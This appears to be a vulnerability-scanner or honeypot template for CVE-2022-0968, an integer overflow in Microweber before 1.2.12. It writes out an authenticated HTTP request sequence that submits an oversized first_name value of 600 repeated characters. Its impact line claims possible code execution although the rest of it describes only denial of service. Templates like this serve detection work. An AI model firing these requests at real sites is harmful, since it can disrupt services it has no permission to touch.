id: CVE-2022-0968
info:
  name: Microweber <1.2.12 - Integer Overflow
  author: amit-jd
  description: 'Microweber before 1.2.12 is susceptible to integer overflow. The application
    allows large characters to insert in the input field ''first & last name,'' which
    can allow an attacker to cause a denial of service via a crafted HTTP request.

    '
  severity: medium
  impact: 'Successful exploitation of this vulnerability could lead to remote code
    execution or denial of service.

    '
  remediation: First name and last name input should be limited to 50 characters or
    maximum 100 characters.
  reference:
  - https://huntr.dev/bounties/97e36678-11cf-42c6-889c-892d415d9f9e/
  - https://github.com/advisories/GHSA-5fxv-xx5p-g2fv
  - https://huntr.dev/bounties/97e36678-11cf-42c6-889c-892d415d9f9e
  - https://nvd.nist.gov/vuln/detail/CVE-2022-0968
  - https://github.com/microweber/microweber/commit/80e39084729a57dfe749626c3b9d35247a14c49e
  classification:
    cvss-metrics: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H
    cvss-score: 5.5
    cve-id: CVE-2022-0968
    cwe-id: CWE-190
    epss-score: 0.00076
    epss-percentile: 0.30933
    cpe: cpe:2.3:a:microweber:microweber:*:*:*:*:*:*:*:*
  metadata:
    max-request: 3
    vendor: microweber
    product: microweber
  tags: cve,cve2022,overflow,microweber,cms,huntr
traps:
- request:
    method: POST
    path: /api/user_login
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: 'username={{username}}&password={{password}}

      '
  response:
    status_code: 200
    headers: {}
    body: ''
- request:
    method: GET
    path: /admin/view:modules/load_module:users/edit-user:2
    headers: {}
    body: ''
  response:
    status_code: 200
    headers: {}
    body: ''
- request:
    method: POST
    path: /api/user/2
    headers:
      Content-Type: application/x-www-form-urlencoded; charset=UTF-8
    body: 'thumbnail=&id=2&token={{form_token}}&_method=PATCH&username={{user}}&verify_password=&first_name={{payload}}&last_name=test&email={{email}}&phone=&is_admin=0&is_active=1&basic_mode=0&api_key=

      '
  response:
    status_code: 200
    headers: {}
    body: '"first_name":"{{repeat("A", 600)}}"'
